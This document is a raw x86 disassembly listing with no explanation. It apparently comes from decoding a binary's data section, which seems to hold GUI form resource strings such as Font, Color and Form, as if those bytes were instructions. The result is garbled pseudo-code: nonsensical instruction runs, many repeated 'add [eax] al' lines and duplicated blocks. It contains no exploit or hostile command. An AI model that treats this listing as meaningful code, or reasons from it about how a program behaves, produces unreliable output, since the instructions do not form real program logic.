add [ eax ] ah
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x3e300040 ] ah
inc ecx
add [ eax + 0x3f ] al
inc ecx
add [ eax + 0x3f ] cl
inc ecx
add [ edi ] dl
inc esp
add [ ecx ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
test [ eax + eax + 0x48 ] al
test [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x7c ] cl
inc esp
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
scasb [ edi ]
inc esp
jb r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41b118
sub [ eax ] al
add bh bh
cmp [ esi + 0x10044 ] ch
add [ eax ] al
add [ eax ] al
add [ eax - 0xffffec ] al
add [ eax ] eax
add eax 0x6f6c6f43
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
hlt
adc eax 0xecb03c01
add [ edx + esi * 4 + 0x72f80044 ] bh
inc ebx
add ah cl
mov dl 0x44
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
add [ eax - 0x4fffbc54 ] cl
je r-xdata
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax ] bh
mov [ 0xffffffff9f500043 ] al
add [ eax + 0x5c004374 ] dh
inc ecx
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
xor [ edx - 0x5377ffbc ] 0x43
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add [ 0x676e6152 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
dec [ edi + ebp * 4 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
inc esp
outsd
insb
outsd
jb r-xdata
push esi
outsd
insb
nop
aam 0x87
inc esp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
mov bh 0x44
add [ ebx + esi * 4 + 0x44 ] cl
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
test al 0xb9
inc esp
add ah ch
inc eax
call [ eax + edi * 4 ]
inc esp
add al dh
mov eax 0xb9140044
inc esp
add [ eax - 0x13ffbb47 ] ch
add [ ebp + esi * 2 + 0x43 ] ah
add [ esi * 2 - 0x5e7bffbd ] cl
inc ebx
add [ edi + edi * 2 + 0x43 ] dl
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add al dh
mov al [ 0xffffffffb32c0043 ]
inc esp
add ah bl
mov ch 0x44
add [ eax ] dl
mov eax 0x60044
add eax 0x15011400
add [ eax + esi * 4 ] edi
in al dx
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ esp + ebx * 2 ] dl
inc ebx
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
inc esp
cmp [ ebx ] al
pop eax
cmp eax [ ebx ]
add al 0x3a
inc ebx
add [ ebx + edi * 2 + 0x5cc40043 ] al
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xb30c0044
inc esp
add [ eax ] dl
jbe r-xdata
add [ edx + ebx * 2 + 0x43 ] al
add [ eax + 0x2e ] al
inc ebx
add [ esi + edi + 0x41 ] bl
add [ ecx + 0x43 ] ah
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x6083ffbf ] dl
inc ecx
inc eax
inc ebx
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
add eax 0x6f500800
jae r-xdata
adc [ eax ] al
or al 0x0
add bh bh
insb
scasb [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ebx ] al
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
rol [ esi + 0xc00044 ] 0x43
add [ 0x6f460500 ] cl
jb r-xdata
add [ edi + ebx * 4 + 0x41 ] dh
add [ edx - 0x4df7ffbf ] bl
inc esp
add [ edi - 0x5347ffbd ] bl
inc ecx
add [ edi + ebx * 4 + 0x41 ] bh
jae r-xdata
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
outsd
ja r-xdata
mov [ eax + eax + 0x3 ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
add [ 0x4c000000 ] al
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
fsubr [ edi + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] dh
xchg [ eax + eax + 0x3 ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
rol al 0x86
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
xchg [ eax + eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 4 - 0x7845ffbc ] dl
inc esp
add [ edx + eax ] bl
add [ eax ] al
or al 0xfd
inc edx
add [ edx + 0x41 ] bh
add [ ebx ] al
add [ eax ] al
add [ eax + 0xc004489 ] dl
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
add eax 0x6d726f46
jae r-xdata
bound esi [ ebx + 0x53 ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ecx * 4 + 0x44 ] cl
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
lea eax [ eax ]
loopne r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
test [ eax + eax + 0x8 ] al
add al [ eax ]
inc esp
mov ah 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ eax ] cl
insb
je r-xdata
dec [ ebp - 0x76bbffc0 ]
inc esp
add [ ebx ] al
add bh bh
insd
adc al 0x11
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
inc esp
mov [ eax + eax + 0x3 ] eax
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
inc esp
add [ esi ] al
or al 0x54
inc edx
outsd
jb r-xdata
mov [ eax + eax + 0x3 ] al
mov [ eax + eax + 0x6 ] al
add eax 0x4c000000
inc eax
add al ah
mov [ eax + eax + 0xf ] al
jb r-xdata
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc esp
add [ edi ] cl
jae r-xdata
outsd
imul ecx [ eax + 0x41 ] 0x0
add [ ebp - 0x15e1bce3 ] esp
sub esp edi
dec ebp
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
dec ebp
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ ecx + ecx * 4 + 0xb030044 ] dl
push esp
inc edx
outsd
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x448914c0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
add [ eax ] al
dec esp
jb r-xdata
test [ eax + eax + 0xc ] al
add al [ eax ]
call esp
mov ah 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
add [ eax ] al
add [ edx + ecx * 4 + 0x64090044 ] dl
insd
je r-xdata
inc esp
popa
inc esp
jne r-xdata
cwde
je r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x77 ] al
inc esp
add [ eax ] cl
jae r-xdata
push eax
outsd
jb r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
popad
je r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
nop
inc esi
outsd
jb r-xdata
jae r-xdata
jo r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
jae r-xdata
push cs
jo r-xdata
mov eax eax
in al 0x89
inc esi
outsd
jb r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al bh
mov [ eax + eax + 0xa ] eax
jo r-xdata
jb r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
or [ ebp + ebp * 2 + 0x50 ] esp
xor al 0x8b
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
jb r-xdata
insd
push eax
jb r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
jb r-xdata
outsb
insb
jns r-xdata
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
mov al [ eax + eax + 0x9 ]
insd
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
arpl [ ecx + 0x4e ] sp
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add ah dh
adc [ eax ] al
xor [ ebx + 0x408d0044 ] cl
add al al
mov eax [ eax + eax + 0x8 ]
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
mov al [ eax + eax + 0x6 ]
outsd
inc eax
add [ ebx + ecx * 4 + 0x44 ] bh
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] dh
mov eax [ eax + eax + 0x6 ]
jl r-xdata
jo r-xdata
dec esi
outsd
outsb
push cs
jb r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
inc esp
add [ esi ] al
or al 0x54
shl ah 0x89
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ch
mov al [ eax + eax + 0x3 ]
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
jae r-xdata
mov [ eax + eax - 0x70 ] eax
cld
nop
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor [ ebx + 0x63060044 ] cl
popad
dec esi
popad
dec ebp
inc esp
jae r-xdata
je r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x731bffc0 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jo r-xdata
add [ esi ] al
add [ eax ] cl
inc esp
inc esi
outsd
jb r-xdata
je r-xdata
jns r-xdata
popa
jne r-xdata
mov al [ eax + eax + 0x3 ]
andps xmm0 [ ebp + 0x66 ]
push esp
push eax
dec edi
ja r-xdata
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc esp
add [ eax ] al
add [ eax ] al
cmp al 0x10
jbe r-xdata
add [ edx + 0x41 ] bh
add ah al
mov ebx 0xbd780044
inc esp
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ eax ] al
call 0x644cf91
jae r-xdata
jb r-xdata
jo r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
jb r-xdata
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add al bl
lea eax [ eax + eax + 0x7c ]
pop [ eax + eax ]
add [ eax ] al
inc esp
add [ eax + 0x500043ac ] cl
retn
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add dl bh
lea eax [ eax + eax + 0x6a ]
pop [ eax + eax - 0x8 ]
add al [ eax ]
add [ esi + eax * 4 + 0x44 ] dh
outsb
je r-xdata
js r-xdata
jb r-xdata
or edx [ ebx + eax * 2 + 0x6c ]
mov eax [ eax + eax + 0x8 ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc eax
mov [ eax + eax + 0x8 ] es
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jb r-xdata
lea eax [ eax ]
xchg esp eax
mov [ eax + eax + 0x3 ] eax
or edx [ edx + eax * 2 + 0x6f ]
inc esi
outsd
jb r-xdata
insd
outsd
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
in al 0x8c
inc eax
add [ eax + edx ] bh
inc esp
add [ ebx + esi ] dh
inc eax
add ah ah
loope r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
mov [ eax + eax + 0x3 ] eax
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax + 0xc0044e1 ] ah
jne r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
adc [ eax + 0x6f ] esi
add [ eax ] al
fmul [ eax + 0x2500044 ]
add [ eax ] al
adc [ ecx + 0x2640044 ] cl
add [ eax ] al
cmp eax 0x14000f00
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x2
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
sub_448cea
inc esp
add [ esi + edi + 0x41 ] bl
add [ eax - 0x23ffbb41 ] ah
mov edi 0xc0e80044
inc esp
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x369fffbf ] dl
inc esp
add [ edi + ebx * 4 + 0x41 ] dh
add [ eax ] al
add eax 0xba380045
inc esp
add [ edi - 0x5347ffbd ] bl
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax + 0xc0044e1 ] ah
jne r-xdata
add [ eax ] al
fmul [ eax + 0x2500044 ]
add [ eax ] al
adc [ ecx + 0x2640044 ] cl
add [ eax ] al
cmp eax 0x14000f00
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x2
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
sub_448e7c
inc esp
add [ eax - 0x16 ] dh
inc esp
add [ eax ] cl
jmp r-xdata
add [ edx + eax ] cl
inc ebp
add [ ebx + esi * 8 + 0x2dc0044 ] bh
inc ebp
add ah bl
add eax [ ebp ]
je r-xdata
inc esp
add ah bl
add al [ ebp ]
fadd [ ebx ]
inc ebp
add [ esp + esi * 8 + 0x44 ] dh
add ah dh
out dx al
inc esp
add [ eax - 0x67ffbb30 ] dh
hlt
inc esp
sub_448ec0
inc esp
add [ ecx + esi * 8 - 0xce3ffbc ] bh
inc esp
add [ edx + eax ] cl
inc ebp
add [ ebx + esi * 8 + 0x2dc0044 ] bh
inc ebp
add ah bl
add eax [ ebp ]
je r-xdata
inc esp
add ah bl
add al [ ebp ]
fadd [ ebx ]
inc ebp
add [ esp + esi * 8 + 0x44 ] dh
add ah dh
out dx al
inc esp
add [ eax - 0x67ffbb30 ] dh
hlt
inc esp
sub_448fa0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_44d441
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
nop
inc esp
add al bh
add al [ eax ]
add [ eax + 0x7c00448c ] bl
mov [ 0xffffffffbbc40041 ] al
inc esp
add [ eax - 0x43 ] bh
inc esp
add [ ebx + esi ] dh
inc eax
add ah ah
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
nop
inc esp
add [ eax ] al
inc esp
add [ eax + 0x500043ac ] cl
retn
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x3c004123 ] bh
add [ eax ] al
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
push esp
adc [ eax ] al
loope r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ 0x726f4654 ] al
insd
add [ eax + 0xc0044e1 ] ah
jne r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ ecx + 0x75 ] al
je r-xdata
jo r-xdata
add bh bh
inc esi
outsd
jb r-xdata
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
in al dx
inc edx
add [ eax + 0x39 ] dh
mov [ eax + eax + 0x29 ] al
add al [ eax ]
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
cmp al [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax 0x69420800
inc esp
imul ecx [ ebp + 0x6f ] 0x89e06564
inc esp
add [ eax ] ch
add al [ eax ]
call eax
rol [ eax + eax - 0x38 ] 0x1
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
